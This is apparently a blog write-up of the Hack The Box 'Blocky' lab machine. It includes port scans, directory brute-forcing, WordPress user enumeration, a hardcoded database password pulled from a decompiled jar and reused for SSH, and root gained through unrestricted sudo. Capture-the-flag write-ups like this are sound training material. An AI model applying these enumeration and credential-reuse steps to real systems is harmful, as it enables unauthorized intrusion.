---
layout: post
title:  "HTB Blocky Machine Writup"
date:   2020-1-2 00:10:00 +0000
categories: hackthebox
---
Blocky was another standard box with a few potential rabbit holes to fall down. There was also a 2nd potential method of gaining information through phpmyadmin which i didnt investigate.
# Nmap scan
```
PORT     STATE  SERVICE VERSION
21/tcp   open   ftp     ProFTPD 1.3.5a
22/tcp   open   ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 d6:2b:99:b4:d5:e7:53:ce:2b:fc:b5:d7:9d:79:fb:a2 (RSA)
|   256 5d:7f:38:95:70:c9:be:ac:67:a0:1e:86:e7:97:84:03 (ECDSA)
|_  256 09:d5:c2:04:95:1a:90:ef:87:56:25:97:df:83:70:67 (ED25519)
80/tcp   open   http    Apache httpd 2.4.18 ((Ubuntu))
|_http-generator: WordPress 4.8
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: BlockyCraft &#8211; Under Construction!
8192/tcp closed sophos
```


Full port scan
```
PORT      STATE  SERVICE
21/tcp    open   ftp
22/tcp    open   ssh
80/tcp    open   http
8192/tcp  closed sophos
25565/tcp open   minecraft
```

# Web server directory bruteforce
```
[06:51:41] 200 -   51KB - /
[06:52:26] 301 -  309B  - /wiki  ->  http://10.10.10.37/wiki/
[06:52:39] 301 -  315B  - /wp-content  ->  http://10.10.10.37/wp-content/
[06:53:51] 301 -  312B  - /plugins  ->  http://10.10.10.37/plugins/
[06:54:59] 301 -  316B  - /wp-includes  ->  http://10.10.10.37/wp-includes/
[06:56:13] 301 -  315B  - /javascript  ->  http://10.10.10.37/javascript/
```
Directories mention 'wp-content' and 'wp-includes' which are wordpress directories so theres a solid chance we will be interacting with wordpress.

# User enumeration
Since we know wordpress is running, we can enumerate the site with wpscan. Wpscan manages to pull the username 'notch' from the rss feed.

# Initial shell
Going back to recon through the 'plugins' directory we get access to a 'cute file browser' with 2 files:
```
- Blockycore.jar
- griefprevention.jar
```
We can use online decompilers to decompile the java into somewhat readable code.
From the blockycore file we get credentials that are hardcoded.
{% highlight java %}
public class BlockyCore {
public String sqlHost = "localhost";
public String sqlUser = "root";
public String sqlPass = "8YsqfCTnvxAUeduzjNSXe22";
{% endhighlight %}

Logging in to ssh with user 'notch' and that password gives us our foothold and user flag.

# Privilege escalation
A sudo check reveals instantly what our method of gaining root privs will be.
```
notch@Blocky:~$ sudo -l
[sudo] password for notch: <ssh_pw>
Matching Defaults entries for notch on Blocky:
env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User notch may run the following commands on Blocky:
(ALL : ALL) ALL
```
'sudo su' gives us root.
